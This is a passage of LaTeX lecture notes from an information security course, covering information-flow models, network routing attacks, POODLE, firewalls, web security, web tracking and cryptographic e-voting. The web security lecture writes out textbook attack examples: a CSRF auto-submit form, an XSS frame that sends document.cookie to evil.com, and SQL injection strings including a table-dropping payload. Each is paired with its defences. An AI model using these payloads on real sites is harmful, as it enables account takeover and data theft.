Tradeoffs:
\begin{itemize}
    \item cryptographic

    (+) totally decentralized \\
    (--) if capability leaks, big trouble\\
    want some kind of revocation, but hard to do
    
    \item OS table
    
    (+) can control flow of passage of capabilities\\
    (+) revocation is much easier\\
    (--) centralized, requires overhead, lack of flexibility, 
\end{itemize}

\subsektion{Logic-based authorization}
Define a formal logic, with primitives for
\begin{itemize}
    \item principals (e.g. users/groups)
    \item objects
    \item delegation
    \item time
\end{itemize}
To get access, submit a proof that you are authorized

Parties make statements by digital signing

System allows for great complexity in policies, but only need simple proof-
checking mechanism to make it work. But also need to work out a way to get
people able to write these statements, and deal with possible large proof size

Caveat: people don't actually use complicated access control mechanisms, and
usually just leave them as the defaults or make it visible to the whole world

Want to come up with a system which infers what the user wants from the way the
user behaves (best if not visible to user)
>>>>>>> 8e525b42b773087a879a1983645b17cc93ee0bb7
}{
% Lecture 9: 08 October 2014
\sektion{9}{Information flow and multi-level security}
Information flow: how to control propagation of information within a program or
between programs on a system where there is some confidentiality requirement.

Consider a program $P(v, s, r)$:
\begin{itemize}
    \item $v$: visible (public) input
    \item $s$: secret input
    \item $r$: random seed
\end{itemize}
Output: all visible actions of program. Output doesn't "leak" s. 

Does the output of $P$ leak information about $s$? Define a game against
adversary guessing between two possible secrets $s$ (similar to semantic security). To avoid leakage, the distribution of outputs must be independent of $s$ for all possible values of $v$.

Game:
\begin{itemize}
	\item adversary chooses v, $s_0$, $s_1$
	\item we announce P(v, $s_b$, r), where $b \in \{0,1\}$, r are secret and random
	\item adversary guesses b
\end{itemize}

We say P doesn't leak s if adversary can't be correct with probability non-negligibly greater than $50\%$ (assuming a computationally-limited adversary).

How to enforce non-leakiness?

Unlike with previous properties, cannot enforce by watching $P$ run.
(Just because no output came out doesn't mean there wasn't a leak - ``dog that
didn't bark problem''). We can't prove this property by testing. It's inherently necessary to consider what-ifs that differ from what you actually saw. 

Also, in practice requirement are more complex (more complex labels, and different labels on different data). 

Generalization:
\begin{itemize}
	\item label information (e.g. inputs)
	\item put requirements on outputs
	\item enforce that outputs respect requirements
\end{itemize}

\subsektion{Lattice model}
General model for information flow policy

\begin{definition}{Lattice}

    $(S, \sqsubseteq)$, $S$: set of states, $\sqsubseteq$: partial order such
    that for any $a, b \in S$, there is a least upper bound of $a, b$ and a
    greatest lower bound of $a,b$.

    partial order:
    \begin{itemize}
        \item reflexive: $a \sqsubseteq a$
        \item transitive: $a \sqsubseteq b$ and $b \sqsubseteq c$, then
            $a \sqsubseteq c$
        \item asymmetric: $a \sqsubseteq b$ and $b \sqsubseteq a$, then $a = b$
    \end{itemize}
    least upper bound of $a, b$:
    \begin{itemize}
        \item $a \sqsubseteq U$ and $b \sqsubseteq U$ and for all $V \in S$,
            $a \sqsubseteq V$ and $b \sqsubseteq V$ $\Rightarrow$
            $U \sqsubseteq V$
    \end{itemize}
    greatest lower bound of $a, b$:
    \begin{itemize}
        \item $L \sqsubseteq a$ and $L \sqsubseteq b$ and for all $V \in S$,
            $V \sqsubseteq a$ and $V \sqsubseteq a$ $\Rightarrow$
            $V \sqsubseteq L$
    \end{itemize}
\end{definition}
\begin{example}{Lattices}
    \begin{enumerate}
        \item linear chain of labels:

            public $\sqsubseteq$ confidential

            unclassified $\sqsubseteq$ classified $\sqsubseteq$ secret
                $\sqsubseteq$ top secret
        \item compartments (e.g. project, client ID, job function)

            state is set of labels, $\sqsubseteq$ is subset
        \item org chart

            state is node in chart, $\sqsubseteq$ is ancestor/descendant
        \item combination/cross product of lattices

            state is $(S_1, S_2)$, $(A_1, B_1) \sqsubseteq (A_2, B_2)$ iff
            $A_1 \sqsubseteq A_2$ and $B_1 \sqsubseteq B_2$
    \end{enumerate}
\end{example}
\subsektion{Information flow in a program}
At each point in the program, every variable has a state/label (that comes from the
lattice we're using). Inputs are tagged with state. Outputs are tagged with a requirement. States are propagated
when code executes.

Example: $a = b + c$; State($a$) = LUB(State($b$), State($c$))
[LUB = Least Upper Bound]

Before providing output, check that state of output value is consistent with
policy. (For example, only allowed to emit unclassified output.) Formally, ensure that $label(v) \sqsubseteq L$, where L is the required policy.

But this isn't enough (only monitoring and rejecting when inconsistent with
policy) -- ``dog that didn't bark'':
\begin{verbatim}
// State(a) = ``secret''
// State(c) = State(d) = public
b = c;
if (a > 5)  b = d;  // Requires static (compile-time) analysis to get right
output b;   // Says something about a, so should be labelled as secret
\end{verbatim}
Static analysis won't catch all, but will catch some of the leaks.
\begin{description}
    \item[Problem 1:] conservative analysis leads to being overly cautious
    \item[Problem 2:] timing might depend on values (can lead to covert channel attacks)
\end{description}

{\bf What if you can't prevent a program from leaking the information it has?}

Conservative assumption (contagion model): every programs leaks all its inputs to all its outputs. 

{\bf Bell-LaPadula model}: lattice-based information flow for programs and files
\begin{itemize}
\item every program has a state (from lattice): what it's allowed to access
\item every file has a state: what it contains
\item Rule 1: ``No Read Up'' - Program $P$ can read File $F$ only if State($F$)
    $\sqsubseteq$ State($P$)
\item Rule 2: ``No Write Down'' - Program $P$ can write File $F$ only if
    State($P$) $\sqsubseteq$ State($F$)
\end{itemize}
\begin{theorem*} If State($F_1$) $\sqsubseteq$ State($F_2$) and the two rules are
enforced, then information from $F_2$ cannot leak into $F_1$.
\end{theorem*}

Problems:
\begin{enumerate}
    \item exceptions (need to make explicit loopholes in system to allow)
    \begin{itemize}
        \item declassify/unprotect old data
        \item what about encryption (hope "secret" ciphertext doesn't leak plaintext)
        \item aggregate/``anonymized'' data
        \item policy decision to make exception
    \end{itemize}
    \item usability - system can't tell you if there are classified files in a
        directory you're trying to delete or no space on disk for you to add a
        file
    \item outside channels - people talk to each other outside the system
\end{enumerate}

This, so far, has been about confidentiality. Can we do the same thing for
integrity?
\begin{itemize}
    \item State: level of trust in integrity of information
    \item ensure high-integrity data doesn't depend on low-integrity inputs
        (try to avoid GIGO problem)
\end{itemize}

{\bf Biba model}: (B-LP for integrity)
\begin{itemize}
    \item Label/state: how much we trust program with respect to integrity/how important file is
    \item Rule 1: ``No Read Down''
    \item Rule 2: ``No Write Up''
\end{itemize}

B-LP model and Biba model at the same time?
\begin{itemize}
    \item if use same labels for both (high confidentiality = high integrity),
        then no communication between levels
    \item if different labels, then some information flows become possible, but
        could result in being much more difficult for users
    \item result: usually focus on confidentiality or integrity and let humans
        worry about this outside of the system
\end{itemize}
\sidenote{{\bf Back to crypto...}

Secret sharing:
\begin{itemize}
    \item divide a secret into ``shares'' so that all share are required to
        reconstruct secret
        \begin{itemize}
            \item 2-way: pick a large value $M$, secret is some $s$,
                $0 \le s < M$\\
                pick $r$ randomly, $0 \le r < M$\\
                shares are $r$, $(s-r) \mod M$\\
                to reconstruct, add shares $\mod M$
            \item $k$-way: shares $r_0, r_1, \dots, r_{k-2}$ random,
                $(s - (r_0 + \cdots + r_{l-2})) \mod M$
            \item can also construct degree $k$ polynomials such that $k$ values
                are needed to reconstruct
        \end{itemize}
    \item suppose RSA private key is $(d, N)$, shares
        $(d_1, N), (d_2, N), (d_3, N)$ such that
        $d_1 + d_2 + d_3 = d \mod(p-1)(q-1)$

        $\left(X^{d_1} \mod N\right)\left(X^{d_2}\right)\left(X^{d_3}\right) =
        X^{(d_1 + d_2 + d_3)\mod(p-1)(q-1)} \mod N = X^d \mod N$

        (splits up an RSA operation)
\end{itemize}
}
}{
%!TEX root = InfoSec.tex
% Lecture 10: 13 October 2014
\sektion{10}{Securing network infrastructure}
The internet is a network of networks. Each network is an ``autonomous system'' such as ISPs. For example, Princeton is one autonomous system. Each autonomous system is run by a separate administrator, and they connect together at exchange points. There are about 40,000 autonomous system numbers assigned.

\textbf{Internet routing}\\
Routing is based on BGP (border gateway protocols). BGP is how autonomous systems talk to each other about routing information. IP is the actual routing protocol. 

\textbf{Shortest path routing}\\
This is a simplified way of viewing BGPs. Think of each autonomous system as a single node.
\begin{itemize}
	\item routers talk to each other
	\item they exchange topology and cost info
	\item each router calculates the shortest path to destination based on its neighbors' distances

		``If my closest neighbor can get to destination in 4 steps, then I can get there in 5 steps''

		BUT routers can lie about paths and costs
	\item router calculates the next hop based on neighboring path costs
	\item router forwards packet to the next hop
\end{itemize}

An adversary node can lie about its costs and route packets to itself. There might exist a tunnel for packet reinjections if Z and Z' are both adversarial. Then, Z can modify all packets and send it to Z' for reinjection. This is called prefix hijacking

\subsektion{Prefix Hijacking}
(This often happens as a result of accidental misconfiguration). 

\begin{example}
China ``hijacked the internet'' when it announced route to a random-ish 15\% of the internet. It is an autonomous system (AS) big enough that it didn't get crushed under the load, and simply forwarded the traffic while the user did not notice anything.
\end{example}

Malice is unlikely through prefix hijacking
\begin{enumerate}
	\item can't bypass app-level encryption
	\item can't store all the traffice
	\item it's very easily detectable
\end{enumerate}

\subsektion{How to defend?}
Can crypto help? Remember that AS's can lie about their own links and costs and about
what other nodes said. So, crypto \textit{can} prevent lying about what neighbors said but it \textit{can't} prevent lying about your own links.

\textbf{Routing relies on trust}\\
It is a different adversary model compared to application-layer security. 
\begin{itemize}
	\item small number of AS's
	\item AS's are well known
	\item and physically connected
	\item AS's also don't want to advertise shorter paths than reality because then
		they will likely be overloaded with traffic and go down
\end{itemize}
All of the above are natural protection against attacks. It's not an ideal setup, but it's not terrible either. Is there a much better way to design BGP if we were to do it over? Unclear.

\subsektion{IP packet}
These contain source and destination IP addresses. Can these things be spoofed? 
\begin{itemize}
	\item source IP? yes
	\item destination IP? no, that doesn't even make sense
\end{itemize}

Nodes can only verify claimed source address back one hop; this is why IPs are spoofable. For example, DoS attacks spoof their return IP addresses.

\subsektion{Ingress/egress filtering}
(This is what takes place at the ``gateway'' of the AS)

Ingress filtering: discard incoming packet if source IP is inside the AS (because why would that happen in real life? It wouldn't). This protects against types of DoS. Potects yourself.

Egress filtering: discard outgoing packet if source IP is outside. This protects against types of DoS if adversary takes over internal computer and tries to send DoS packets. Protects the rest of the internet.

\textbf{DDoS is easy if you have a lot of zombies}\\
\textit{More difficult:} DoS from a single machine with more traffic than machine is capable of. So the goal? Amplication of traffic volume.

\textbf{Smurf attack}\\
Attacker broadcasts ECHO request with spoofed source IP address (this is the victim's IP address). All networks hosts (broadcast recipients) hear broadcast and respond. Except they respond to the victim, who is overwhelmed with traffic.

\subsektion{DNS attacks}
DNS: The system that takes a domain name and translate it into an IP address.

\textit{User requests example.com $\rightarrow$ recursive name server $\rightarrow$ root server $\rightarrow$ recursive name server $\rightarrow$ TLD name servers $\rightarrow$ recursive name server $\rightarrow$ thousands of name servers $\rightarrow$ recursive name server $\rightarrow$ 192.168.31}

\textbf{Root servers}\\
Requests are delivered to the root server who is closest and available.

\textbf{Cache poisoning}\\
In the words of Wikipedia: ``DNS spoofing (or DNS cache poisoning) is a computer hacking attack, whereby data is introduced into a Domain Name System (DNS) resolver's cache, causing the name server to return an incorrect IP address, diverting traffic to the attacker's computer (or any other computer).''

\subsektion{Prevention: DNSSEC}
DNS root servers: root of trust\\
DNS hierarchy: chain of trust; each name server signs public keys of servers it delegates to. Resolvers and some clients have root public keys built in. This only authenticates -- no encryption.

\subsektion{Crypto and layers}
Crypto can be incorporated into different layers:\\
Secure sockets layer (SSL) and transport layer security (TLS)
\begin{itemize}
	\item Application level security (or rather, between application and transportation)
	\item Authentication hostnames, encrypts sessions over TCP
	\item Keys verified using certs/certificate authorities
\end{itemize}
IPSec
\begin{itemize}
	\item Network layer security
	\item Authenticates IP addresses, encrypts IP packets
	\item Keys are distributed/verified by DNA or manually
	\item It's a mess because (1) key distribution sucks (2) authenticating IP addresses is hard for user to sanity check (3) network level is hard to implement since IP is stateless
\end{itemize}

\sidenote {
	\textbf{NSA MUSCULAR}\\
	NSA was physically tapping into links between Google data centers, and between Yahoo data centers. IPSec would have stopped this.
}
}{
%!TEX root = InfoSec.tex
% Lecture 11: 15 October 2014
\sektion{11}{Firewalls and virtual private networks}

\subsektion{POODLE attack}
\begin{enumerate}
	\item Become a network MITM 
	\item inject code into an http page that the victim visits; code runs in victim's browser
	\item attacker's code connects repeated to (for example) https://mail.google.com/
	\item attacker forces use of legacy SSL3 protocol
	\item exploit SSL3 to see plaintext
	\item get victim's authentication cookie for gmail
	\item impersonate victim :(
\end{enumerate}

\textbf{Specifically, how is (4) done?}\\
Version negotiation: both endpoints discuss which version of the secure protocol to use. Negotiation must begin in cleartext since you can't start encrypting until you know which encryption methods the other party can use. MITM can pretend that both sides can only use SSL3, called a \textbf{version downgrade attack}.

Defense: sign the exchange and ensure that what A sent is what B saw.

\textbf{The downgrade dance}\\
If, for some reason, negotiation fails a number of times, both sides just use SSL3. A MITM attack can also exploit this to force both sides to use SSL3.

\textbf{Okay, so now how is (5) done?}\\
How does SSL3 perform ``authenticated encryption''?\\
Block cipher in CBC mode: $E(x || M(x))$. An adversary can mess around with the padding and not get caught because the padding is garbage (as opposed to 10*). There's a 1/256 chance of finding one byte. The adversary can then shift the stream of bytes and read the message.

\subsektion{Firewalls and VPNs}
Perimeter defense
\begin{itemize}
	\item separate outside from inside
	\item monitor the boundary
	\item block incoming stuff that's bad or ``weird''
\end{itemize}

Firewall = perimeter defense for network

Simple firewall: inside = ``clients'' only (end users; eg. tablets, phones, computers)\\
Policy: allow connection if initiated from the inside.\\
Implementation: packet filter that allows outgoing packets and blocks incoming if non TCP or TCP SYN (connection initiation)

\subsektion{Firewall Admin/Security}
This is important because it controls the network communication, and is a MITM by definition. It (1) shuts off/limits network services on the firewall itself and (2) should accept connections only from the inside.

Initiating a TCP connection involves a 3 step package exchange handshake. 

\textbf{Network Address Translation}\\
aka NAT\\
Your whole network shares a single ``real'' IP address. Outsiders cannot target a machine inside the network because they aren't even addressable from the outside. It's also a nice setup because you only need to buy one IP address from the network provider.

NAT keeps a translation table of inside IP addresses to their outside IP address equivalents. For example, $10.0.0.13:85 \Rightarrow 11.12.13.14:2015$ where the former is the inside address and the latter is the outside.

NAT maintains the illusion of IP addresses for inside destinations so that both sides can communicate without know NAT is in the middle. 

\sidenote {
	\textbf{Building/maintaining translation tables}\\
	Add an entry when an outgoing packet is initiating a TCP connection.\\
	Tear down an entry when
	\begin{itemize}
		\item see an orderly shutdown of a TCP connection
		\item unused for a long time\\

		Keep-alives (little packets sent periodically) exist to keep this from happening\\

		OR if endpoints need to use the connection again, the connection will be broken. This is fine.
	\end{itemize}
}

\sidenote {
	\textbf{Fictitious IP address ranges}\\
	Four numbers, each represent a byte.\\
	10.*.*.*\\
	192.168.*.*
}

\subsektion{Supporting your own servers}
If you want to have your own server inside the autonomous system, how might you set it up?
\begin{enumerate}	
	\item Exception in your NAT rules to allow outside to access your server.

		Downside: If your server is compromised, the attacker has access to your internal network/have gotten past your firewall
	\item Put the server on the outside

		Downside: You don't have direct access to the server, also probably more expensive. Though, we're trending towards this approach
	\item DMZ approach: inside network -- firewall -- server -- firewall -- THE INTERNET

		Downside: It's more complicated since it has more firewalls
	\item Single firewall, but with two servers: public and private. Incoming emails would be delivered to the public server. A siphon pulls messages from the public server into the private server, where users can get to the emails. The siphon is presumably strong and encrypted.
\end{enumerate}}{
%!TEX root = InfoSec.tex
% Lecture 12: 20 October 2014
\sektion{12}{Web Security}
\textit{Note: see piazza for lecture slides}

\textbf{Two sides of web security}
\begin{enumerate}
	\item browser side
	\item web applications\\
		\hspace*{1cm} $\bullet$ written in php, asp, tsp, ruby, etc.\\
		\hspace*{1cm} $\bullet$ include attacks like sql injection
\end{enumerate}

Some web threat models include passive or active network attackers, and malware attackers, who control a user's machine by getting them to download something.

\subsektion{Browser execution model}
\begin{enumerate}
	\item Load content
	\item Renders (processes html)
	\item Responds to events
		\begin{itemize}
			\item User actions: onClick, onMouseover
			\item Rendering: onLoad
			\item Timing: setTimeout(), clearTimeout()\\
		\end{itemize}
\end{enumerate}

\sidenote{
	\textbf{Javascript}\\
	There are three ways to include javascript in a webpage: \texttt{inline <script>}, in a linked file \texttt{<script src="something" >}, or in an event handler attribute \texttt{<a href="example.com"  onmouseover="alert(`hi')" >}

	The script runs in a ``sandbox'' in the front end only.\\	
	}

\textbf{Same-origin policy}\\
Scripts that originate from the same SERVER, PROTOCOL, and PORT may access each other/each other's DOMS with no problem, but they cannot access another site's DOM. The exception to this is when you link js with a \texttt{<script src="" >}.

The user is able to grant privileges to signed scripts (UniversalBrowserRead/Write)

\textbf{Frame and iFrame}\\
A Frame is a rigid division. An iFrame is a floating inline frame. They provide structure to the page and delegate screen area to content from another source (like youtube embeds). The browser provides isolation between the frame and everything else in the DOM.

\subsektion{Cookies}
After a request, a server might do \texttt{set-cookie: value}. When the browser revisits the page, it will \texttt{GET ... cookie: value} and the server responds based on that cookie.\\

Cookies hold unique pseudorandom values and the server has a table of values. So, cookies are often used alongside authentication. BUT it's only safe to use cookie authentication via HTTPS; otherwise, someone can read the ``authenticator cookie''.

\subsektion{CSRF: Cross-Site Request Forgery}
The same browser runs a script from a good site and malicious script from a bad site. Requests to the good site are authenticated by cookies. The malicious script can make forged requests to the good site with the user's cookie.
\begin{itemize}
	\item Netflix: change account settings
	\item Gmail: steal contacts
	\item potential for much bigger damage (ie. banking)
\end{itemize}

How might this happen?
\begin{enumerate}
	\item User establishes session with victimized server
	\item User visits the attack server
	\item User receives malicious page
		\begin{verbatim}
		<form action="victimized server page form">
		    <input> fields </input>
		</form>
		<script> document.forms[0].submit() </script>
		\end{verbatim}
	\item attack server sends forgest request to victimized server via the user and this form
\end{enumerate}

\textit{Login CSRF}\\
Attacker sends request so that victim is logged in as attacker. Everything the victim does gets recorded on the attacker's account; or, if the victim is receiving incoming payments/messages, the attacker will get them.

\textbf{CSRF Defenses}
\begin{itemize}
	\item Secret validation token
		% this is what att does in the phone history checker
		\texttt{<input type="hidden" value="1124lfjq2l3ir" >}

		You want to bind the sessionID to a particular token. How? (1) a state table at the server or (2) HMAC of sessionID
	\item Referer validation (in the header). An attacker script will say that referer is ``attacker.com''

		Lenient: referer in header=optional\\
		Strict: referer in header=required\\

		To prevent login CSRF, you want strict referer validation and login forms submitted over HTTPS. HTTPS sites in general use strict referer validation. Other sites use ROR or frameworks that implement this stuff for you.
	\item Custom HTTP header. \texttt{X-Requested-By: XMLHttpRequest}	
\end{itemize}

\subsektion{Cross Site Scripting (CSS)}
\begin{example}
evil.com sends the victim a frame:
	\begin{verbatim}
	<frame src="naive.com/hello?name=
	    <script>window.open('evil.com/steal.cgi?cookie='' + document.cookie)</script>
	">
	\end{verbatim}
Then, naive.com is opened and the script is executed, where the referer looks like naive.com. The naive.com cookie is sent as a parameter in a request to evil.com, and steal.cgi is executed with the cookie.
\end{example}

\textbf{Other CSS risks}\\
A form of ``reflection attack'' can change the contents of the affected website by manipulating DOM components. For example, an adversary may change form fields.

\textbf{Defenses}\\
\begin{enumerate}
	\item Escape output so that in the above example, you would display 
		\begin{verbatim}
			$lt;script$gt; post(evil.com, document.cookie) ...
		\end{verbatim}
		instead of executing a script
	\item Sanitize inputs by stripping all tags $<>$
\end{enumerate}

\subsektion{SQL injection}

\begin{example}
	\texttt{'); Drop Tables; --}\\
	\hspace*{2cm}deletes tables
\end{example}

\begin{example}
	\verb|SELECT * WHERE user ='' OR WHERE pwd LIKE '%'|\\
	\hspace*{2cm}will select every row and login with their credentials.
\end{example}

\begin{example}
	\verb|authenticate if username="valid_user" OR 1=1 |\\
	\hspace*{2cm} $1=1$ is always true, will give you data/allow you to login. can then setup account for bad guy on DB server itself.
\end{example}


\begin{example}
	\verb|... UNION SELECT * FROM credit cards|\\
	\hspace*{2cm} can pull data from other tables
\end{example}

\textbf{Defenses}\\
\begin{itemize}
	\item Input validation

		Filter out apostrophes, semicolons, \%, hyphens, underscores. Also check data type (eg. make sure an integer field actually contains an int)
	\item Whitelisting

		Generally better than blacklisting (like above) because
		\begin{itemize}
			\item you might forget to filter out certain characters
			\item blacklisting could prevent some valid input (like last name O'Brien)
			\item allowing only a well-definied set of safe values is simpler
		\end{itemize}
	\item escape quotes
	\item use prepared statements
	\item Blind variables:

		\texttt{?} placeholders guaranteed to be data and not a control sequence %this is what Cherokee did
\end{itemize}

}{ % See lecture slides
%!TEX root = InfoSec.tex
% Lecture 13: 22 October 2014
\sektion{13}{Web Privacy}
\textit{Note: see piazza for lecture slides}

\subsektion{Third parties}
Third parties (ie. not the site you're visiting), typically invisible, are compiling profiles of your browsing history. There is an average of 64 tracking mechanisms (visible) on a top 50 website, and possibly more invisible ones! 

\textbf{Why tracking?}\\
Behavioral targeting: Send info to ad networks so that user interests are targeted.(Online advertising is a huge and complicated industry)

Trackers include cookies, javascript, webbugs (1px gifs), where a third party domain is getting your information.

\sidenote{
	\textbf{The market for lemons}\\
	George Akerlof, 1971\\
	"Why do people still visit websites that collect too much data?"
	\begin{enumerate}
		\item buyers/users can't tell apart good and bad products
		\item sellers/service providers lose incentive to provide quality (in the case of the internet, privacy)
		\item the bad crowds out the good since bad products are more profitable\\
	\end{enumerate}
}

\textbf{Issues with tracking}\\
\begin{itemize}
	\item intellectual privacy
	\item behavioral targeting
	\item price discrimination
	\item NSA eavesdropping!\\
\end{itemize}

\textbf{Aliasing} \\
If you visit hi5.com with subdomain ad.hi5.com but DNS redirects to ad.yieldmanager.com. Your browser is tricked since this works even if you block 3rd party cookies.

\subsektion{Tagging}
Placing data in your browser

These include etags, cookies, content cache, browsing history, window.name, HTTP STS, etc. With HTTP STS in particular, it can be exploited to tag your browser.

\begin{definition}
	A server can set a flag in a user's browser that says that a certain site can only be accessed securely, through https
\end{definition}

\sidenote{
	\textbf{HTTP STS tagging exploit}\\
	A server can set 1 bit per domain in the sense that the ``must use https'' flag is either on or off. Now, let's say that IDs are 32-bit integers. The server can create 32 subdomains and set tracking bits according to the ID by embedding the request to each subdomain in the page.\\
}

\subsektion{Fingerprinting}
Observing your browser's behavior via things like 
\begin{itemize}
	\item user-agent
	\item HTTP ACCEPT headers
	\item installed fonts
	\item cookies enabled y/n?
	\item screen resolution
\end{itemize}
If you add/hash together all this information, you can likely get a unique fingerprint for your browser! ie. Panopticlick.com

\sidenote{
	\textbf{Anonymous vs. Pseudoanonymous vs. Identity}\\
	Truly anonymous shouldn't be able to track you under a pseudonym in a different session. (How the Internet started)\\

	Pseudononymous can tell when same person comes back but don't know real-life identity. (Internet post-cookies)\\

	Identity can get back to real-life identity.\\
}

\subsektion{More ways for websites to get your identity}
\begin{enumerate}
    \item Third party is sometimes a first party: have first party relationship
        with social networking sites but they're also as widgets on other pages

        Example: Facebook's Like button -- even if you don't click it, Facebook
        knows you were on that page
    \item Leakage of identifiers:

        \begin{tt}
        GET http://ad.doubleclick.net/adj/...\\
        Referer: http://submit.SPORTS.com/...?email=\color{red}{jdoe@email.com}\\
        Cookie: id=\color{red}{35c192bcfe0000b1...}\\
        \end{tt}

        Identity has been compromised now and in the future

    \item Third party buys your identity: free iPod scam passing your email to
        first party site
\end{enumerate}

\sidenote{
    \textbf{Security bugs:}
    \begin{itemize}
    \item http://google.com/profiles/me redirects to \\
        http://google.com/profiles/randomwalker\\

        In firefox, can put the url in a script tag, JavaScript throws error
        which includes the url, giving randomwalker or other identity just
        from visiting this random page\\

        Mozilla's solution: only tell original, not redirected URL

    \item Google spreadsheets: people don't necessarily understand can be public \\

        Can specify all in URL in search to get public spreadsheets\\

        Can embed invisible Google spreadsheet and look at ``Viewing now'' on another machine-- how to tell which of these users to serve what to? Use lots of different spreadsheets. Assign users to a subset of
        10 spreadsheets, and then chance of overlap pretty low. \\

        Google fixed by showing user as Anonymous when on a public spreadsheet even when logged in, revealing identity only if explicitly shared with that user (and the user accepted).\\
    \end{itemize}
}

\subsektion{How security bugs contribute to online tracking}
\textit{This entire section from 2012}
\begin{itemize}
    \item History sniffing and privacy:

        CSS :visited property; how can the web page figure out the color? Check
        in JavaScript
        \begin{itemize}
            \item getComputedStyle()
            \item cache timing: on page, try to download something as embedded;
                if visited before, faster due to caching
            \item server hit: based on if browser downloads image or not
        \end{itemize}
    \item Identity sniffing:
        \begin{itemize}
            \item All social networking sites have groups that users can join
            \item Users typically join multiple groups, some of which are public
            \item Group affiliations act as fingerprint
            \item Predictable group-specific URLs exist
        \end{itemize}
        Look through memebers of groups and see who matches in all the groups
        the user has joined

        Fix as browser: ensure that a site can't see what color a link is by
        keeping track of who (browser's rendering component vs programmatic
        component) is making the query

        Fix as social network: make the URLs not predictable
    \item One-click fraud: Display IP address and approximate location, so user
        assumes the site knows who you are

        What if the website actually has your identity and makes a credible
        threat?
    \item Not a bug:

        Facebook's instant personalization: Facebook tells partner sites who you
        are
\end{itemize}

\subsektion{Defenses}
\begin{enumerate}
	\item \textbf{Referer blocking}

		Two drawbacks: (1) many sites check these for CSFR defense. Blocking all referer headers will break websites.
	\item Third-party cookie blocking

		Relatively little breakage, but doesn't prevent fingerprinting. 

		Safari's cookie blocking policy: It blocks third party cookies unless user is submitting a form, or browser already has cookie from the same party (eg. a facebook ``like'' button still works). 

		Google ad network tried getting around this by using invisible forms
	\item ``Do not track'' option in browsers
	\item HTTP request blocking

		Compile and maintain a list of known trackers based on domain names and regexes. The user installs a browser extension (like adblock plus), which downloads the above list and blocks requests to objects on the list.

		Drawbacks: False positives/negatives; need to trust the list.
\end{enumerate}

}{ % See lecture slides
%!TEX root = InfoSec.tex
% Lecture 14: 3 November 2014
\sektion{14}{Electronic voting}

Requirements
\begin{itemize}
	\item only authorized voters can vote
	\item $\leq$ 1 ballot per voter
	\item ballots counted as cast
	\item secret ballot; "receipt-free" (cannot prove to 3rd party how you voted)
\end{itemize}

Logically, this involves two steps: (1) cast ballot into ballot box and (2) tally ballot box to get result.

\textbf{Old fashioned paper ballots} are cheap to operate, easy to understand, but problematic if ballot is long/complex. Trickery is possible to: For example, \textit{chain voting} is when ``goons'' fill out a ballot and coerce people to deposit that ballot into the box and return the blank one to them; repeats. There needs to also be a chain of custody on the ballot box.

\subsektion{End-to-End (E2E) crypto voting}
\begin{example}
	Benaloh\\
	\begin{enumerate}
		\item voter encrypts ballot, casts ciphertext ballot
		\item system publishes the ciphertext (CT) ballot on a public bulletin board
		\item at the end of the election, tally the votes.

		(1) shuffle and reencrypt CT ballots\\
			CT ballots can't be matched to originals; trustees collectively decrypt CT ballots

		(2) reencrypted CT ballots public, anyone can do tally
	\end{enumerate}
\end{example}

The tricky part is reencryption.
\begin{definition}
Randomized encryption: One plaintext can go to many possible cipher texts
\end{definition}

\begin{definition}
Rencryption means that given ciphertext C, compute reenc(C) [randomized] such that
$$\text{decrypt(reenc(C)) = decrypt(C)}$$
Additionally, (C, reenc(C)) needs to be indistinguishable from (C, reenc(C')). Essentially, so you can't figure out which reencryption goes with which of the inputs.
\end{definition}

\subsektion{El Gamal encryption method}
\begin{itemize}
	\item Public parameters g, p (like Diffie-Hellman)
	\item Private key: x
	\item Public key: $g^x \mod p$
	\item to encrypt message m
		\begin{itemize}
			\item pick random value r
			\item compute $(g^r \mod p,\ mg^{rx} \mod p)$
			\item To decrypt with private key? Given (A, B) compute $A^{-x}B \mod p$
		\end{itemize}
\end{itemize}

\subsektion{Reencryption in El Gamal}
\begin{itemize}
	\item Given (A, B), generate random r'
	\item Compute
		\begin{align*}
		(A*g^{r'} \mod p,\ B * g^{r'x} \mod p) 
		&= (g^r * g^{r'} \mod p,\ m g^{rx} g^{r'x} \mod p)\\
		&= (g^{r+r'} \mod p,\ m g^{(r+r')x} \mod p)
		\end{align*}
	\item We see that $r+r'$ can decrypt the message! Also, these two CTs are indistinguishable!
\end{itemize}

\sidenote{
	\textbf{How do we know shuffler didn't cheat?}\\
	They start with a "ballot box" $B$ (sequence of encrypted ballots) and end with $B'$, which should be equivalent (reordering of reenc of $B$)\\
}

\textbf{Proof protocol}
\begin{itemize}
	\item prover produces $B_1$
	\item $B_1$ should be equivalent to $B$ and $B'$
	\item prover (shuffler) knows the correspondence between $B$ and $B_1$, and also between $B_1$ and $B'$

	Note: if $B$ is not equivalent to $B'$, then $B_1$ can't be equive to both
	\item challenger flips coin, asks prover to show equivalence between $B$ and $B_1$, or $B'$ and $B_1$
	\item prover ``unwraps'' the equivalence

	``Look, we can get from $B'$ to $B$ by reenc with these random values then reordering like this''

	BUT remember that you can't show the equivalence between all three because then the challenger would know a path from $B$ to $B'$ and you don't want that.
\end{itemize}

Play this proof game $k$ times. If the prover is lying ($B$ not equivalent to $B'$) he will get away with it with probability $2^{-k}$.

This whole complicated game is designed to convince us that B and B' are in fact equivalent without telling us what the exact mapping is between B and B'

\textbf{This seems like a problem} since there exists someone that know the correspondence between voters and ballots. BUT we can use multiple shuffling steps so that we only need one honest shuffler to maintain the secret ballot 

\textit{Upshot: can know 1-1 correspondence between voters and published plaintext ballots, but not what the correspondence is}

\textbf{A lurking attack}
What if the voter remembers the random r used to encrypt their ballot? The voter can prove how they voted by revealing $r$.
		$$\text{enc ballot} = (g^r \mod p, m g^{rx} \mod p)$$

Fix? Introduce a trusted voting machine that the voter cannot manipulate; it encrypts ballot and refuses to reveal $r$. But yet another problem: how do you know voting machine protects integrity and confidentiality of ballot? 

\subsektion{In summary}
\begin{tabular}{|l|l|}
\hline
PAPER & ELECTRONIC\\
\hline
counting: slow, expensive & counting: fast, cheap\\
voter sees record directly & voter does not see record directly\\
main threat: tampering afterwards & main threat: tampering beforehand\\
\hline
\end{tabular}


\textbf{PAPER + ELECTRONIC RECORDS:} method of choice

Example: optical scan voting. Voter fills out paper ballot, feeds ballot not scanner, scanner records electronic record, paper ballot feeds into ballot box

HYBRID COUNT
\begin{itemize}
	\item count electronic records
	\item statistical audit for consistency of the paper records with the electronic records 
	\item for sample of ballots, compare by hand
\end{itemize}


% ELECTRONIC RECORDS:	


% PAPER + ELECTRONIC RECORDS: <-- method of choice
}{
%!TEX root = InfoSec.tex
% Lecture 15: 5 November 2014
\sektion{15}{Backdoors in crypto standards}
\textit{Note: see piazza for lecture slides}

